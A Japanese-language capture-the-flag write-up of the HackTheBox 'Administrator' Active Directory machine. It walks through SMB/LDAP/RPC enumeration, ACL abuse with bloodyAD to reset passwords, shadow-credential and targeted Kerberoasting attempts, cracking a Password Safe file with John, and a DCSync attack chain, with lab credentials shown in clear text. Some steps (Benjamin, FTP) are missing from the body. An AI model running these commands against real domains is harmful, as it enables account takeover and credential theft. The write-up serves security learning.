```sh

└─$ echo 'export RHOSTS="10.129.74.135"' | tee -a .zshrc
```

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
```

#### LDAP(389/tcp)

:::details LDAPとは？
読み方: エルダップ
正式名称: Lightweight Directory Access Protocol
意味: Active Directoryのようなディレクトリサービスに対して、ユーザーやグループなどの情報を問い合わせるためのプロトコル
:::

匿名バインドでの情報取得を試す。

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ ldapsearch -x -H ldap://${RHOSTS} -b "dc=administrator,dc=htb"
# extended LDIF
#
# LDAPv3
# base <dc=administrator,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090C78, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```

> a successful bind must be completed on the connection

匿名バインドは許可されていない。ここも一旦保留。

#### RPC(135/tcp)

:::details rpcclientとは？
読み方: アールピーシークライアント
意味: WindowsのRPC(Remote Procedure Call)サービスに対して、nullセッション(未認証)でも通る場合にユーザーやグループの情報を引き出せるツール
:::

nullセッションでのユーザー列挙を試す。

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ rpcclient -U "" -N ${RHOSTS}
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

こちらもアクセス拒否。匿名/nullでの列挙は軒並みブロックされている。

#### SMB(445/tcp)

:::details SMBとは？
読み方: エスエムビー
正式名称: Server Message Block
意味: Windowsのファイル共有・プリンタ共有などに使われるプロトコル。ADが絡む場合は何かしらの足掛かりになりがち
:::

SMBのnull認証が通るか確認する。

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ nxc smb ${RHOSTS} -u '' -p ''
SMB         10.129.74.135   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.74.135   445    DC               [+] administrator.htb\:
```

> (Null Auth:True)

SMBのnullセッションだけは通る。ただし、これがそのまま列挙に使えるとは限らないので、共有一覧列挙やRID bruteforceも試してみる。

:::details nullセッションとは？
読み方: ヌルセッション
意味: ユーザー名・パスワードを何も指定しない(空)状態で確立するSMBセッション。本来は匿名アクセスを許可しないための対策が入っているべきだが、設定によってはセッション確立自体は通ってしまい、そこから先(共有一覧やユーザー列挙など)にどこまで進めるかはサーバー側の設定次第
:::

:::details RID bruteforceとは？
読み方: アールアイディー・ブルートフォース
正式名称: RID(Relative Identifier) Bruteforce
意味: WindowsのSID(Security Identifier)末尾に付与される連番のRID部分を1から順に総当たりし、対応するユーザー名やグループ名を割り出す列挙手法。SAMR経由でのアクセス権があれば、認証情報が無い状態でもドメイン内のアカウント一覧を推測できてしまう
:::

まずは共有一覧を列挙してみる。

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ smbclient -N -L //${RHOSTS}/
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.74.135 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

続けてRID bruteforceも試す。

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ nxc smb ${RHOSTS} -u '' -p '' --rid-brute
SMB         10.129.74.135   445    DC               [-] Error connecting: LSAD SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
```

共有一覧は空、RID bruteforceもアクセス拒否。null authは通るがそこから先に進めない、という状態だった。

:::message
本来SMBのnullセッション自体は無効化されているべきだが、設定不備などによりnull authが許可されており、匿名でのセッション確立自体は可能な状態だった。

ただし今回はそこから先(共有列挙・RID bruteforce)は別途権限が必要だったため、致命的な情報漏えいには繋がらなかった。設定不備の脆弱性(部分的)という位置付け。
:::

### Oliviaを使ったEnum

匿名でのEnumでは大きな収穫が無かったので、HTBのAccessタブでデフォルトで渡されているOliviaユーザで試す。

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ nxc smb ${RHOSTS} -u 'Olivia' -p 'ichliebedich'
SMB         10.129.74.135   445    DC               [+] administrator.htb\Olivia:ichliebedich
```

認証が成功することを確認したうえで、bloodyADを使ってOliviaが書き込み権限を持つオブジェクトを取得する。

:::details bloodyADとは？
読み方: ブラッディエーディー
意味: Active Directory環境に対して、LDAP経由でオブジェクトの属性取得・書き込み・パスワード変更などを行えるPythonツール。BloodHoundのグラフ解析と組み合わせて使うことが多い
:::

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ bloodyAD --host ${RHOSTS} -d administrator.htb -u Olivia -p ichliebedich get writable
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=administrator,DC=htb
permission: WRITE
distinguishedName: CN=Olivia Johnson,CN=Users,DC=administrator,DC=htb
permission: WRITE
distinguishedName: CN=Michael Williams,CN=Users,DC=administrator,DC=htb
permission: CREATE_CHILD; WRITE
OWNER: WRITE
DACL: WRITE
distinguishedName: DC=administrator.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=administrator,DC=htb
permission: CREATE_CHILD
distinguishedName: DC=_msdcs.administrator.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=administrator,DC=htb
permission: CREATE_CHILD
```

> CN=Michael Williams,...
> OWNER: WRITE
> DACL: WRITE

OliviaがMichaelというユーザーオブジェクトに対して、OWNER相当＋DACL書き込みという事実上のフルコントロールを持っていることが判明。

:::message
本来オブジェクトの所有権(Owner)は厳格に管理されるべきだが、設定不備によりOliviaがMichaelオブジェクトのオーナー権限相当を保持していた。Oliviaを起点にMichaelへの権限昇格が可能な状態であると判断できる。ACL設定不備の脆弱性。
:::

## Foothold

Michaelに対するOWNER/DACL権限を悪用し、bloodyADでShadow Credentialsを追加してみる。

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ bloodyAD --host ${RHOSTS} -d administrator.htb -u Olivia -p ichliebedich add shadowCredentials michael
[+] KeyCredential generated with following sha256 of RSA key: 686d98505612ef924467ce04dc1a384efda1f20700404dfb32ce7ed67ac6ede6
[-] PKINIT failed on DC 10.129.74.135, you must find a Kerberos server with a certification authority!
[+] PKINIT PFX certificate saved at: michael_CL.pfx
```

> you must find a Kerberos server with a certification authority!

Shadow Credentialsを試したが、このドメインにはADCS(証明書発行局)自体が構築されていないため、PKINIT(証明書ベースのKerberos認証)そのものが機能しない環境っぽい。

:::details Shadow Credentials Attackとは？
読み方: シャドウクレデンシャルズアタック
意味: 対象ユーザーオブジェクトのmsDS-KeyCredentialLink属性に、攻撃者が用意した証明書の公開鍵情報を書き込み、その証明書を使ってPKINIT(証明書ベースのKerberos認証)でログインする手法。

対象ユーザーの既存パスワードを変更しないため検知されにくいのが特徴。GenericWrite/GenericAll/Owner権限などを持つオブジェクトに対して実行できる
:::

方針を切り替え、bloodyADでMichaelのパスワードを直接変更してから認証を確認する。

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ bloodyAD --host ${RHOSTS} -d administrator.htb -u Olivia -p ichliebedich set password michael 'Password123!'
[+] Password changed successfully!

┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ nxc smb ${RHOSTS} -u michael -p 'Password123!'
SMB         10.129.74.135   445    DC               [+] administrator.htb\michael:Password123!
```

PWを変更して認証が通るか確認したところ、Michaelとしての認証が通った。せっかくなのでWinRM(5985番ポート)も試したところ、直接ログインできることも分かった。

:::details なぜ方針を切り替えてパスワードリセットにしたのか
Shadow CredentialsがCA非搭載環境で構造的に詰まることが分かったので、OWNER/DACL WRITE権限を素直に使ってパスワードを直接変更する方針に切り替えた。
:::

:::details evil-winrmとは？
読み方: エビルウィンアールエム
意味: Windows Remote Management(WinRM)経由でリモートPowerShellセッションを確立するためのツール
:::

WinRM経由でもログインできるか確認する。

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ nxc winrm ${RHOSTS} -u michael -p 'Password123!'
```

## Privilege Escalation

:::details BloodHoundとは？
読み方: ブラッドハウンド
意味: Active Directory環境内のユーザー・グループ・ACLの関係性をグラフ化し、権限昇格につながる攻撃パスを視覚的に見つけ出すためのツール。CE(Community Edition)はDocker Composeで構築するタイプが主流
:::

BloodHoundでデータを収集する。

```sh

└─$ bloodhound-python -u 'michael' -p 'Password123!' -ns ${RHOSTS} -d administrator.htb -c All --zip
INFO: Found 1 domains
INFO: Found 1 computers
INFO: Found 11 users
INFO: Found 53 groups
```

> Backup.psafe3

Password Safeのデータベースファイルを発見。

:::details .psafe3形式とは？
読み方: ピーセーフスリー
意味: Password Safe(パスワード管理ソフト)が使うデータベースファイル形式。1つのマスターパスワードで暗号化された箱の中に、複数サイト/アカウント分のユーザー名・パスワードをまとめて保管できる。マスターパスワードさえ割れば中身は全て読める
:::

早速ファイルを取得し、マスターパスワードのクラックを試みる。

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ get Backup.psafe3

┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ pwsafe2john Backup.psafe3 > psafe.hash

┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 ASIMD 4x])
tekieromucho     (Backu)
1g 0:00:00:00 DONE (2026-08-30 01:24) 2.325g/s 11906p/s
```

> tekieromucho

マスターパスワードが割れたので、`pwsafe`コマンド[^1] で中身を確認する。

:::details John the Ripperとは？
読み方: ジョン・ザ・リッパー
意味: 様々な形式のハッシュ・暗号化ファイルに対して辞書攻撃やブルートフォースを行うパスワードクラッキングツール
:::

ただし、ユーティリティがデフォルトではインストールされていなかったので追加。CLIツール自体は`passwordsafe`パッケージに含まれているらしい。

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ apt install -y passwordsafe

┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ pwsafe Backup.psafe3
```


Ethanがドメイン全体に対してGetChanges, GetChangesAll権限を持っているということは、DCSyncが可能と判断。

:::details DCSyncとは？
読み方: ディーシーシンク
意味: ドメインコントローラーに対して「レプリケーションデータをよこせ」と要求する攻撃手法で、GetChanges, GetChangesAll権限があればドメイン内の全アカウント(krbtgtやAdministrator含む)のパスワードハッシュを直接取得できてしまう
:::

まずはEmilyの資格情報が使えるか確認する。

```sh
┌──(kali㉿kali)-[~/HTB/Administrator]
└─$ nxc smb ${RHOSTS} -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
SMB         10.129.74.135   445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
```

Emilyの認証は通るが、問題はEthanの資格情報がまだ無いこと。EmilyがEthanに対して持つのはGenericWriteなので、PW変更はできない。

ので、Targeted Kerberoastingで横展開を狙う。

:::details なぜTargeted Kerberoastingを選んだのか
GenericWriteは属性の書き込み(Write Property)しかカバーしておらず、パスワードリセットに必要な`User-Force-Change-Password`という拡張アクセス権(Control Access Right)は別枠の権限なので届かない。

Shadow Credentials(PKINIT経由の認証)も、このドメインにADCSが存在しないため機能しない。

一方でSPN(Service Principal Name)属性への書き込みは通常の属性書き込みの範囲内なので、GenericWriteだけで完結する。SPNを1つ追加してやれば、そのユーザーに対してKerberoastingが実行できるようになる。
:::

:::details Kerberoastingとは？
読み方: ケルベロースティング
意味: SPNが設定されたアカウントに対してTGS(サービスチケット)を要求し、そのチケットをオフラインでクラックすることでアカウントのパスワードを割り出す攻撃手法
:::

```sh

└─$ bloodyAD --host ${RHOSTS} -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' set object ethan servicePrincipalName -v 'HTTP/fake'
```

## おわりに

改めて攻撃チェーンを整理すると以下の通り。

1. HTBのAccessタブに記載された初期クレデンシャル(Olivia)でログイン
2. OliviaがMichaelに対して持つOWNER/DACL WRITE権限を悪用し、PWを変更してMichaelを掌握
3. MichaelがBenjaminに対して持つForceChangePassword権限を悪用し、PWを変更してBenjaminを掌握
4. Benjaminの資格情報でFTPにログインし、Password Safeのバックアップファイルを発見・クラック
5. バックアップ内から発見したEmilyの資格情報で、EmilyがEthanに対して持つGenericWrite権限とEthanが保持する権限(GetChanges, GetChangesAll)を確認
6. GenericWriteによるSPN追加でTargeted Kerberoastingを行いEthanのPWをクラック
7. Ethanが保持する権限を悪用しDCSyncを実行。Administratorのハッシュを取得

ACLチェーンを素直に辿るだけでなく、途中でFTP上に置き忘れられたファイルを経由するという構成になっており、「行き止まりに見えたら別の切り口（≒さっきは何も得られなかった経路）も探ってみる」ことの大切さを学べたマシンだった。
